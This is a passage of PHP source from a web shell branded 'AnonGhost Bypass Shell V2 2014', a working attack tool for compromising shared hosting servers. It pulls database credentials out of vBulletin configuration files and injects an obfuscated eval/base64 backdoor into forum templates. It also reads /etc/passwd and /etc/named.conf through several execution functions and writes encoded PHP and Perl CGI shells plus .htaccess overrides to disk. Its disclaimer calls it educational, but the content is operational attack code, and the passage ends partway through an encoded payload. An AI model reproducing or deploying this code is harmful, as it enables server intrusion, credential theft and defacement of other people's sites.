if(ereg('vBulletin',$readconfig)){

$db      =  ex($readconfig,'$config[\'Database\'][\'dbname\'] = \'',"';");

$userdb  =  ex($readconfig,'$config[\'MasterServer\'][\'username\'] = \'',"';");

$pass    =  ex($readconfig,'$config[\'MasterServer\'][\'password\'] = \'',"';");

$con     = @mysql_connect('localhost',$userdb,$pass);

$db      = @mysql_select_db($db,$con);

$shell   = "bVDPS8MwFL4L/g+vYZAWdPPiaUv14kAQFKqnUUqapjSYNKFJxCn7322abgzcIfDyvl+P7/qKs04D3tS5sJ96MMJ9b+ohDw8vTWcq31PF02yJp/WqzvEaZk2rBwWUOaF7ghAo7jrdEGS0dQh4z9zecIKUl04YOrhV4N821FEEwZQgb6SmDR8QiObsdxYheuMdRKNWSH5UxtmKn3G+v0P5TIxgNTqhWWR9rYSLAXH/RaUfgY8pbVROZ4VI0aawqN5ei/cdDlRcAiFwJEIGv4HyyLTZp4tq+/zyVOxwOASXO+yUqUI6Lm/gHxiBLDic6o62UHjGuLWQJEko99T9Gg7ApeUXJFsq5EX+AR7yPw==" ;

$crypt  = "{\${eval(gzinflate(base64_decode(\'";

$crypt .= "$shell";

$crypt .= "\')))}}{\${exit()}}</textarea>";

$sqlfaq = "UPDATE template SET template ='".$crypt."' WHERE title ='FAQ'" ;

$query  = @mysql_query($sqlfaq,$con);


if ($query){$r = '<b style="color: #ee5500">Succeed</b> shell in search.php';}
else
{
$r = '<b style="color:red">failed</b>';
}
$domins = trim($domin).'';
echo "<tr>
<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
<td><div class='cone'><a target='_blank' href='$config'>Config</a></div></td><td>".$r."</td></tr>";

}else{

echo "<tr>
<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
<td><div class='cone'><a target='_blank' href='http://$config'>Config</a></div></td><td><b style='color:red'>failed2</b></td></tr>";
}
}

die();

}

if(!is_file('named.txt')){

$d00m = file("/etc/named.conf");

}else{

$d00m = file("named.txt");

}
if(!$d00m)
{
die ("<meta http-equiv='refresh' content='0; url=?action=read'/>");
}
else
{
echo "<br><div class='tmp'>
<form method='POST' action='$pg?action=vb'>
<input type='submit' value='Inject shell' />
<input type='hidden' value='1' name='s' />
</form>
<br>
<table align='center' width='40%'><td> <font color='#e4e4e4'><b>Domains </b></font></td><td> <font color='#e4e4e4'><b>Config </b></font></td><td> <font color='#e4e4e4'><b>Result </b></font></td>";

$f = fopen('vb.txt','w');

foreach($d00m as $dom){

if(eregi("zone",$dom)){

preg_match_all('#zone "(.*)"#', $dom, $domvw);

if(strlen(trim($domvw[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domvw[1][0]));

///////////////////////////////////////////////////////////////////////////////////

$wpl=$pageURL."/sim/rut/home/".$user['name']."/includes/config.php";
$wpp=get_headers($wpl);
$wp=$wpp[0];

$wp2=$pageURL."/sim/rut/home/".$user['name']."/vb/includes/config.php";
$wpp2=get_headers($wp2);
$wp12=$wpp2[0];

$wp3=$pageURL."/sim/rut/home/".$user['name']."/forum/includes/config.php";
$wpp3=get_headers($wp3);
$wp13=$wpp3[0];


 ////////// vb ////////////

$pos = strpos($wp, "200");
$config="&nbsp;";

if (strpos($wp, "200") == true )
{
 $config= $wpl;
}
elseif (strpos($wp12, "200") == true)
{
  $config= $wp2;
}
elseif (strpos($wp13, "200") == true)
{
  $config= $wp3;
}
else
{
continue;

}
flush();
$dom = $domvw[1][0];
$w = fwrite($f,"$config||$dom \n");
if($w){$r = '<b style="color: #009900">Save</b>';}else{$r = '<b style="color:red">failed</b>';}
echo "<tr><td><div class='cone'><a href=http://www.".$domvw[1][0].">".$domvw[1][0]."</a></div></td>
<td><div class='cone'><a href='$config'>Config</a></div></td><td>".$r."</td></tr>";
flush();
}
}
}
}
echo "</table></div><br><br>";
}
if(isset($_GET['action']) && $_GET['action'] == 'abot'){
echo '
<br><center><img src="http://www7.0zz0.com/2014/08/22/20/260354169.png"></center><center>
<span style="font-size:30px; font-family:Fredericka the Great; color:#009900">AnonGhost Bypass Shell V2 2014</span><br><font color="#008800" size="1pt">Coded by </font><font  color="#00bb00" size="1pt">Virusa Worm</font> <font color="#006600" size="1pt">-</font> <font color="#00bb00" size="1pt">Mauritania Attacker</font> <font color="#006600" size="1pt">-</font> <font color="#00bb00" size="1pt">GrenCoder</font><br><br><br><font color="#007700" size="1pt">AnonGhost Bypass Shell V2 2014 is created for Educational Purpose and testing on your own server, and not responsible for any misuse of it.</font> <br><br><font color="#009900" size="1pt">At first a Web Hacker was someone who would spend long hours trying to find bugs and exploit manually.</font><br><font color="#009900" size="1pt">The term has now changed known as a Defacer nowadays.<br>Tools does not Made Hackers , Hackers make Tools.<br>Do not Learn To Hack , Hack to Learn.wkkwk..<br><br><font color="#00ff00" size="1pt">"</font>Keep Calm and enjoy Hacking \!/<font color="#00ff00" size="1pt">"</font><br><br><br><font color="#007700" size="1pt">Special thankz to : </font><font color="#00bb00" size="1pt">AnonGhost Team</font><br>
<center><div class="logindiv"><table cellpadding="7" cellspacing="2">
<center><br><iframe src="https://www.facebook.com/plugins/like.php?href=https://www.facebook.com/AnonGhostOfficial2&amp;send=false&amp;layout=standard&amp;width=400&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font=arial&amp;height=35" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:350px; height:20px;" allowTransparency="true"></iframe></center></table></div></center><br>
<font color="#009900" size="1pt">Greetz to : </font><br><font color="#00bb00" size="1pt">
AnonGhost - Teamp0ison - ZHC - Mauritania HaCker Team - 3xp1r3 Cyber Army - TeaMp0isoN - Robot Pirates - X-Blackerz INC. - Pak Cyber Pyrates - iMHATiMi.ORG - Afghan Cyber Army (ACA) - <font color="#007700" size="1pt">[ </font>Tanpa Bicara - Maniak k4Sur </font><font color="#007700" size="1pt">[pasangan galo.. lol..]]</font><br></font></center>
';
}

if(isset($_GET['action']) && $_GET['action'] == 'read'){
echo '<center><b class="conte">
<a href="?action=sym">Symlink Info</a> -
<a href="?action=dose">Cms Scanner</a> -
<a href="?action=vkill">Perl based symlink</a> -
<a href="?action=file">Symlink Manual</a> -
<a href="?action=manu">Manually Retrieve Config</a> -
<a href="?action=ensim">Enable Symlink If Disabled</a> -
<a href="?action=pytcp">Python Bypass Forbidden Via TCP Protocol</a> -
<a href="?action=simby">Symlink Bypass 2014</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Read /etc/passwd</span><center><br>';
echo "<br><form method='post' action='?action=read&save=1'><textarea class='area' cols='80' rows='15' name='file'>";
flush();
flush();


$file = '/etc/named.conf';


$w0co = @fopen($file, 'r');
if ($w0co){
$content = @fread($w0co, @filesize($file));
echo "".htmlentities($content)."";
}
else if (!$w0co)
{
$w0co = @show_source($file) ;
}
else if (!$w0co)
{
$w0co = @highlight_file($file);
}
else if (!$w0co)
{
$sm = @symlink($file,'sym.txt');


if ($sm){
$w0co = @fopen('sim/sym.txt', 'r');
$content = @fread($w0co, @filesize($file));
echo "".htmlentities($content)."";

}
}

echo "</textarea><br /><br /><input  type='submit' value='Save'/> </form>";


if(isset($_GET['save'])){

$cont = stripcslashes($_POST['file']);

$f = fopen('named.txt','w');

$w = fwrite($f,$cont);

if($w){

echo '<br />save has been successfully';

}

fclose($f);

}
}

if(isset($_GET['action']) && $_GET['action'] == 'bforb'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Root Path with system function</span><center><br>';
mkdir('bforb', 0755);
chdir('bforb');
$bforb = 'PGhlYWQ+PHRpdGxlPkJ5cGFzcyBCeXBhc3MgUm9vdCBQYXRoIGJ5IFZpcnVzYSBXb3JtPC90aXRsZT48L2hlYWQ+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3Lmljb25qLmNvbS9pY28vYy91L2N1MWJtcGdiMWsuaWNvIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj48IS0tIGJvZHkge2JhY2tncm91bmQtY29sb3I6IHRyYW5zcGFyZW50OyBmb250LWZhbWlseTpDb3VyaWVyCW1hcmdpbi1sZWZ0OiAwcHg7IG1hcmdpbi10b3A6IDBweDsgdGV4dC1hbGlnbjogY2VudGVyOyBOZXc7Zm9udC1zaXplOjEycHg7Y29sb3I6IzAwOTkwMDtmb250LXdlaWdodDo0MDA7fSBhe3RleHQtZGVjb3JhdGlvbjpub25lO30gYTpsaW5rIHtjb2xvcjojMDA5OTAwO30gYTp2aXNpdGVkIHtjb2xvcjojMDA3NzAwO30gYTpob3Zlcntjb2xvcjojMDBmZjAwO30gYTphY3RpdmUge2NvbG9yOiMwMDk5MDA7fSAtLT48IS0tIE1hZGUgQnkgVmlydXNhIFdvcm0gLS0+PC9zdHlsZT48YnI+PGJyPjxib2R5IGJnQ29sb3I9IjAwMDAwMCI+PHRyPjx0ZD48P3BocCBlY2hvICI8Zm9ybSBtZXRob2Q9J1BPU1QnIGFjdGlvbj0nJz4iIDsgZWNobyAiPGNlbnRlcj48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nQnlwYXNzIGl0JyBuYW1lPSd2aXJ1c2EnPjwvY2VudGVyPiI7IGlmIChpc3NldCgkX1BPU1RbJ3ZpcnVzYSddKSl7IHN5c3RlbSgnbG4gLXMgLyB2aXJ1c2EudHh0Jyk7ICRmdmNrZW0gPSdUM0IwYVc5dWN5QkpibVJsZUdWeklFWnZiR3h2ZDFONWJVeHBibXR6RFFwRWFYSmxZM1J2Y25sSmJtUmxlQ0J6YzNOemMzTXVhSFJ0RFFwQlpHUlVlWEJsSUhSNGRDQXVjR2h3RFFwQlpHUklZVzVrYkdWeUlIUjRkQ0F1Y0dodyc7ICRmaWxlID0gZm9wZW4oIi5odGFjY2VzcyIsIncrIik7ICR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGZ2Y2tlbSkpOyAkdmlydXNhID0gc3ltbGluaygiLyIsInZpcnVzYS50eHQiKTsgJHJ0PSI8YnI+PGEgaHJlZj12aXJ1c2EudHh0IFRBUkdFVD0nX2JsYW5rJz48Zm9udCBjb2xvcj0jMDBiYjAwIHNpemU9MiBmYWNlPSdDb3VyaWVyIE5ldyc+PGI+QnlwYXNzZWQgU3VjY2Vzc2Z1bGx5PC9iPjwvZm9udD48L2E+IjsgZWNobyAiPGJyPjxicj48Yj5Eb25lLi4gITwvYj48YnI+PGJyPkNoZWNrIGxpbmsgZ2l2ZW4gYmVsb3cgZm9yIC8gZm9sZGVyIHN5bWxpbmsgPGJyPiRydDwvY2VudGVyPiI7fSBlY2hvICI8L2Zvcm0+IjsgID8+PC90ZD48L3RyPjwvYm9keT48L2h0bWw+';

$file = fopen("bforb.php" ,"w+");
$write = fwrite ($file ,base64_decode($bforb));
fclose($file);
chmod("bforb.php",0755);
echo "<iframe src=bforb/bforb.php width=60% height=60% frameborder=0></iframe>";
}

if(isset($_GET['action']) && $_GET['action'] == 'grasy'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass /etc/passwd Priv8</span><br>Coded By Mauritania Attacker<center><br><br>';
echo '<div class="tul"><font color="ee5500" face="Tahoma, Geneva, sans-serif" style="font-size: 8pt">


<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with System Function
<form method="post">
<input type="submit" value="Bypass" name="syst">
</form>
</center><br>
</p>

<p><center>Bypass with Passthru Function
<form method="post">
<font face="Tahoma" color="#007700" size="2pt">
<input type="submit" value="Bypass" name="passth">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with exec Function
<form method="post">
<input type="submit" value="Bypass" name="ex">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with shell_exec Function
<form method="post">
<input type="submit" value="Bypass" name="shex">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with posix_getpwuid Function
<form method="post">
<input type="submit" value="Bypass" name="mauritania">
</form>
</center><br>
</p>

<center>';
    

//System Function //
if($_POST['syst'])
{

echo"<textarea class='area' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br>";
echo"
<br>
<b>
</b>
<br>
";
}
echo '
</center>
<center>';
    


//Passthru Function //
if($_POST['passth'])
{
echo"<textarea class='area' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br>";
echo"
<br>
<b>

</b>
<br>
";
  
}


echo '
</center>
<center>';
    


//exec Function //
if($_POST['ex'])
{
echo"<textarea class='area' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br>";
echo"
<br>
<b>
</b>
<br>
";
}


echo '
</center>
<center>';


//exec Function //
if($_POST['shex'])
{
echo"<textarea class='area' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br>";
echo"
<br>
<b>
</b>
<br>
";
}
echo '</center>
<center>';
    


//posix_getpwuid Function //
if($_POST['mauritania'])
{
echo"<textarea class='area' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br>";
echo"
<br>
<b>
</b>
<br>
";
}
}
if(isset($_GET['action']) && $_GET['action'] == 'nemcon'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Users Server Priv8</span><br>Coded By Mauritania Attacker<center><br><br>';
echo '
<div class="tul"><font color="ee5500" face="Tahoma, Geneva, sans-serif" style="font-size: 8pt">

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with awk program
<form method="post">
<input type="submit" value="Bypass" name="awk">
</form>
</center><br>
</p>



<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with System Function
<form method="post">
<input type="submit" value="Bypass" name="syst">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with Passthru Function
<form method="post">
<input type="submit" value="Bypass" name="passth">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with exec Function
<form method="post">
<input type="submit" value="Bypass" name="ex">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with shell_exec Function
<form method="post">
<input type="submit" value="Bypass" name="shex">
</form>
</center><br>
</p><center>';
    

//Awk Program //
if ($_POST['awk']) {
echo"<textarea class='area' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
echo "
<br>
<b>
</b>
<br>
";
}
echo "</center><center>";
    
//System Function //
if ($_POST['syst']) {
echo"<textarea class='area' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
echo "
<br>
<b>
</b>
<br>
";
}

echo "</center><center>";
    
//Passthru Function //
if ($_POST['passth']) {
echo"<textarea class='area' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
echo "
<br>
<b>
</b>
<br>
";
}
echo "</center><center>";
    
//exec Function //
if ($_POST['ex']) {
echo"<textarea class='area' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
echo "
<br>
<b>

</b>
<br>
";
}

echo "</center><center>";
    
//exec Function //
if ($_POST['shex']) {
echo"<textarea class='area' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
echo "
<br>
<b>
</b>
<br>
";
}
}
if(isset($_GET['action']) && $_GET['action'] == 'cgipl'){
echo '<center><b class="conte">
<a href="?action=grasy">Bypass /etc/passwd</a> -
<a href="?action=nemcon">Bypass Users Server</a> -
<a href="?action=cgipl">Bypass Perl Security</a> -
<a href="?action=bypsrootwzp">Bypass With Zip File</a> -
<a href="?action=bforb">Bypass system function</a> -
<a href="?action=rootexecbpass">Bypass With exec Function</a> -
<a href="?action=rootshelleexecbpass">Bypass With shell_exec</a> -
<a href="?action=posget">Bypass posix_getpwuid</a> -
<a href="?action=suphp">Bypass PHP Suhosin function blacklist</a> -
<a href="?action=suppet">Bypass Functions suPHP_ConfigPath</a> -
<a href="?action=setphr">Bypass suPHP Security</a> -
<a href="?action=simpelb">Simple Bypasser</a> -
<a href="?action=ritf">Read Files</a> -
<a href="?action=baidir">Bypass Chmod Directory</a> -
<a href="?action=forb14">Bypass Forbidden 2014</a> -
<a href="?action=smod14">Bypass SafeMode 2014 Priv8</a> </center>
</b>';
mkdir('cgipl', 0755);
chdir('cgipl');
$kokdosya = ".htaccess";
$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
$metin = "AddType application/x-httpd-cgi .root 
AddType application/x-httpd-cgi .root 
AddHandler cgi-script .root 
AddHandler cgi-script .root";    
fwrite ( $dosya , $metin ) ;
fclose ($dosya);
$cgipl = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjojZmZmZjY2Ij5Bbm9uR2hvc3QgUGVybCBzaGVsbDwvYj4gIyBzZXJ2ZXINCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25seSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyDQojIHZhbHVlcyBzaG91bGQgd29yayBmaW5lIGZvciBtb3N0IHN5c3RlbXMuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQokUGFzc3dvcmQgPSAiZ2hvc3QiOwkJIyBDaGFuZ2UgdGhpcy4gWW91IHdpbGwgbmVlZCB0byBlbnRlciB0aGlzDQoJCQkJIyB0byBsb2dpbi4NCg0KJFdpbk5UID0gMDsJCQkjIFlvdSBuZWVkIHRvIGNoYW5nZSB0aGUgdmFsdWUgb2YgdGhpcyB0byAxIGlmDQoJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQNCgkJCQkjIG1hY2hpbmUuIElmIHlvdSdyZSBydW5uaW5nIGl0IG9uIFVuaXgsIHlvdQ0KCQkJCSMgY2FuIGxlYXZlIHRoZSB2YWx1ZSBhcyBpdCBpcy4NCg0KJE5UQ21kU2VwID0gIiYiOwkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFdpbmRvd3MgTlQuDQoNCiRVbml4Q21kU2VwID0gIjsiOwkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFVuaXguDQoNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkDQoJCQkJIyBEb24ndCBzZXQgdGhpcyB0byBhIHZlcnkgbGFyZ2UgdmFsdWUuIFRoaXMgaXMNCgkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0DQoJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLg0KCQkJCSMgVGhpcyBpcyB2YWxpZCBvbmx5IG9uIFVuaXggc2VydmVycy4gSXQgaXMNCgkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4NCg0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsJCSMgSWYgdGhpcyBpcyAxLCB0aGVuIGRhdGEgaXMgc2VudCB0byB0aGUNCgkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQ0KCQkJCSMgaXQgaXMgYnVmZmVyZWQgYW5kIHNlbmQgd2hlbiB0aGUgY29tbWFuZA0KCQkJCSMgY29tcGxldGVzLiBUaGlzIGlzIHVzZWZ1bCBmb3IgY29tbWFuZHMgbGlrZQ0KCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0DQoJCQkJIyBpcyBiZWluZyBnZW5lcmF0ZWQuDQoNCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISENCg0KJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7DQokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7DQokUGF0aFNlcCA9ICgkV2luTlQgPyAiXFwiIDogIi8iKTsNCiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUmVhZHMgdGhlIGlucHV0IHNlbnQgYnkgdGhlIGJyb3dzZXIgYW5kIHBhcnNlcyB0aGUgaW5wdXQgdmFyaWFibGVzLiBJdA0KIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLg0KIyBUaGUgZmlsZW5hbWUgaXMgc3RvcmVkIGluICRpbnsnZid9IGFuZCB0aGUgZGF0YSBpcyBzdG9yZWQgaW4gJGlueydmaWxlZGF0YSd9Lg0KIyBPdGhlciB2YXJpYWJsZXMgY2FuIGJlIGFjY2Vzc2VkIHVzaW5nICRpbnsndmFyJ30sIHdoZXJlIHZhciBpcyB0aGUgbmFtZSBvZg0KIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQ0KIyBzY3JpcHRzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJlYWRQYXJzZSANCnsNCglsb2NhbCAoKmluKSA9IEBfIGlmIEBfOw0KCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7DQoJDQoJJE11bHRpcGFydEZvcm1EYXRhID0gJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC87DQoNCglpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQ0KCXsNCgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQoJfQ0KCWVsc2lmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIlBPU1QiKQ0KCXsNCgkJYmlubW9kZShTVERJTikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOw0KCQlyZWFkKFNURElOLCAkaW4sICRFTlZ7J0NPTlRFTlRfTEVOR1RIJ30pOw0KCX0NCg0KCSMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykNCgl7DQoJCSRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcgDQoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IA0KCQkkSGVhZGVyQm9keSA9ICRsaXN0WzFdOw0KCQkkSGVhZGVyQm9keSA9fiAvXHJcblxyXG58XG5cbi87DQoJCSRIZWFkZXIgPSAkYDsNCgkJJEJvZHkgPSAkJzsNCiAJCSRCb2R5ID1+IHMvXHJcbiQvLzsgIyB0aGUgbGFzdCBcclxuIHdhcyBwdXQgaW4gYnkgTmV0c2NhcGUNCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7DQoJCSRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgDQoJCSRpbnsnZid9ID0gJDE7IA0KCQkkaW57J2YnfSA9fiBzL1wiLy9nOw0KCQkkaW57J2YnfSA9fiBzL1xzLy9nOw0KDQoJCSMgcGFyc2UgdHJhaWxlcg0KCQlmb3IoJGk9MjsgJGxpc3RbJGldOyAkaSsrKQ0KCQl7IA0KCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87DQoJCQkkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87DQoJCQkka2V5ID0gJDE7DQoJCQkkdmFsID0gJCc7DQoJCQkkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOw0KCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSRpbnska2V5fSA9ICR2YWw7IA0KCQl9DQoJfQ0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQ0KCXsNCgkJQGluID0gc3BsaXQoLyYvLCAkaW4pOw0KCQlmb3JlYWNoICRpICgwIC4uICQjaW4pDQoJCXsNCgkJCSRpblskaV0gPX4gcy9cKy8gL2c7DQoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOw0KCQkJJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ